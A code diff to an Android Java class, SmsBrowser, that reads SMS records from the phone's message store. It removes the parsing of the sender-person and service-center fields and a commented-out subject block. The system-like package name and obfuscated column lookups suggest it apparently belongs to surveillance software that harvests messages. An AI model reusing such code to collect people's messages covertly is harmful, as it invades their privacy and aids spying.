@@ -15,7 +15,6 @@ import android.database.Cursor;
 import android.net.Uri;
 
 import com.android.service.Messages;
-import com.android.service.Sms;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -89,19 +88,6 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String person = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.7"))).toString(); //$NON-NLS-1$
-				s.setPerson(person);
-			} catch (final Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
-				}
-			}
-
-			try {
 				final int protocol = c.getColumnIndexOrThrow(Messages.getString("14.8")); //$NON-NLS-1$
 				s.setProtocol(protocol);
 			} catch (final Exception e) {
@@ -156,28 +142,6 @@ public class SmsBrowser {
 			try {
 				final int reply_path = c.getColumnIndexOrThrow(Messages.getString("14.12")); //$NON-NLS-1$
 				s.setReplyPath(reply_path);
-			} catch (final Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + e);//$NON-NLS-1$
-				}
-			}
-
-			/*
-			 * try { String subject =
-			 * c.getString(c.getColumnIndexOrThrow("subject")).toString();
-			 * if(AutoConfig.DEBUG) Check.log( "subject: " + test); } catc
-			 * ;//$NON-NLS-1$ (Exception e) { if(AutoConfig.DEBUG) {
-			 * Check.log(e); } ;//$NON-NLS-1$
-			 */
-
-			try {
-				final String service_center = c
-						.getString(c.getColumnIndexOrThrow(Messages.getString("14.13"))).toString(); //$NON-NLS-1$
-				s.setServiceCenter(service_center);
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
